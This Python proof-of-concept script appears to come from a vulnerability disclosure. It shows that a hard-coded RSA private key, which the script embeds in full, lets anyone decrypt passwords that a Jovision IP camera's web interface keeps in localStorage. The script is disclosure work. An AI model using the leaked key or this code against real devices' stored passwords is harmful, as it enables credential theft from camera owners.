#!/usr/bin/env python3
"""
PoC: Hard-coded RSA private key in Jovision IP camera web UI bundle.

Demonstrates that the RSA private key shipped inside the client-side
JavaScript (module 21f2) can be used to decrypt any password stored in
localStorage by the camera's web interface.

This script:
  1. Extracts the hard-coded private and public keys from the JS bundle.
  2. Verifies the keypair is valid and that public and private match.
  3. Encrypts a sample plaintext with the public key (mimicking the
     browser's encoder function).
  4. Decrypts it with the private key (mimicking the browser's decoder,
     i.e. what getStorage() does on every page load).

Requires: pip install pycryptodome
"""

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Random import get_random_bytes
import base64
import sys


# --- Keys as they appear in module 21f2 of the JS bundle -------------------
# These are base64-encoded DER, *without* PEM headers, exactly as found
# in the source. We add the PEM wrapping here.

PUBLIC_KEY_B64 = (
    "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBANL378k3RiZHWx5AfJqdH9xRNBmD9wGD"
    "2iRe41HdTNF8RUhNnHit5NpMNtGL0NPTSSpPjjI1kJfVorRvaQerUgkCAwEAAQ=="
)

PRIVATE_KEY_B64 = (
    "MIIBUwIBADANBgkqhkiG9w0BAQEFAASCAT0wggE5AgEAAkEA0vfvyTdGJkdbHkB8"
    "mp0f3FE0GYP3AYPaJF7jUd1M0XxFSE2ceK3k2kw20YvQ09NJKk+OMjWQl9WitG9p"
    "B6tSCQIDAQABAkA2SimBrWC2/wvauBuYqjCFwLvYiRYqZKThUS3MZlebXJiLB+Ue"
    "/gUifAAKIg1avttUZsHBHrop4qfJCwAI0+YRAiEA+W3NK/RaXtnRqmoUUkb59zsZ"
    "UBLpvZgQPfj1MhyHDz0CIQDYhsAhPJ3mgS64NbUZmGWuuNKp5coY2GIj/zYDMJp6"
    "vQIgUueLFXv/eZ1ekgz2Oi67MNCk5jeTF2BurZqNLR3MSmUCIFT3Q6uHMtsB9Eha"
    "4u7hS31tj1UWE+D+ADzp59MGnoftAiBeHT7gDMuqeJHPL4b+kC+gzV4FGTfhR9q3"
    "tTbklZkD2A=="
)


def wrap_pem(b64_body: str, label: str) -> str:
    """Turn a single-line base64 blob into a PEM-formatted string."""
    lines = [b64_body[i:i + 64] for i in range(0, len(b64_body), 64)]
    return f"-----BEGIN {label}-----\n" + "\n".join(lines) + f"\n-----END {label}-----\n"


def banner(text: str) -> None:
    print("\n" + "=" * 72)
    print(text)
    print("=" * 72)


def main() -> int:
    banner("Step 1: Loading keys extracted from JS bundle (module 21f2)")

    pub_pem = wrap_pem(PUBLIC_KEY_B64, "PUBLIC KEY")
    priv_pem = wrap_pem(PRIVATE_KEY_B64, "PRIVATE KEY")

    print(pub_pem)
    print(priv_pem)

    try:
        pub_key = RSA.import_key(pub_pem)
        priv_key = RSA.import_key(priv_pem)
    except (ValueError, IndexError, TypeError) as e:
        print(f"[!] Failed to parse keys: {e}")
        return 1

    print(f"[+] Public key parsed OK  — {pub_key.size_in_bits()} bits")
    print(f"[+] Private key parsed OK — {priv_key.size_in_bits()} bits")
    print(f"[+] Private key has_private()  = {priv_key.has_private()}")

    banner("Step 2: Verifying the keypair matches")

    # If the public modulus/exponent derived from the private key matches
    # the shipped public key, they are a valid pair.
    if pub_key.n == priv_key.n and pub_key.e == priv_key.e:
        print("[+] CONFIRMED: public and private keys are a matching pair.")
        print(f"    modulus n  = {hex(pub_key.n)}")
        print(f"    exponent e = {pub_key.e}")
    else:
        print("[!] Keys do NOT match — something is off with the extraction.")
        return 1

    banner("Step 3: Encrypt a sample password with the public key")
    print("    (this mimics the browser's encoder: a['b'](plaintextPassword))")

    sample_plaintext = b"SuperSecret123!"
    print(f"    plaintext: {sample_plaintext.decode()}")

    # jsencrypt (the library used in the bundle) defaults to PKCS#1 v1.5
    # padding, not OAEP. Match that here.
    cipher_pub = PKCS1_v1_5.new(pub_key)
    ciphertext = cipher_pub.encrypt(sample_plaintext)
    ciphertext_b64 = base64.b64encode(ciphertext).decode()

    print(f"    ciphertext (b64, what lands in localStorage):")
    print(f"      {ciphertext_b64}")

    banner("Step 4: Decrypt with the shipped private key")
    print("    (this mimics getStorage(): a['a'](localStorage.password))")

    cipher_priv = PKCS1_v1_5.new(priv_key)
    sentinel = get_random_bytes(16)
    recovered = cipher_priv.decrypt(ciphertext, sentinel)

    if recovered == sentinel:
        print("[!] Decryption failed.")
        return 1

    print(f"    recovered plaintext: {recovered.decode()}")

    if recovered == sample_plaintext:
        banner("RESULT: POC SUCCESSFUL")
        print("The RSA private key shipped in the client-side JavaScript bundle")
        print("successfully decrypts data encrypted with the matching public key.")
        print()
        print("Impact: any attacker who obtains a stored password blob from")
        print("localStorage (via XSS, physical access, browser forensics, or")
        print("shared workstation) can recover the plaintext password offline")
        print("using only the keys extracted from the publicly-served JS bundle.")
        print()
        print("The same private key is baked into the firmware image and is")
        print("therefore identical across every device of this product line,")
        print("worldwide. Compromise of one device's bundle compromises all.")
        return 0
    else:
        print("[!] Decryption succeeded but plaintext does not match. Weird.")
        return 1


if __name__ == "__main__":
    sys.exit(main())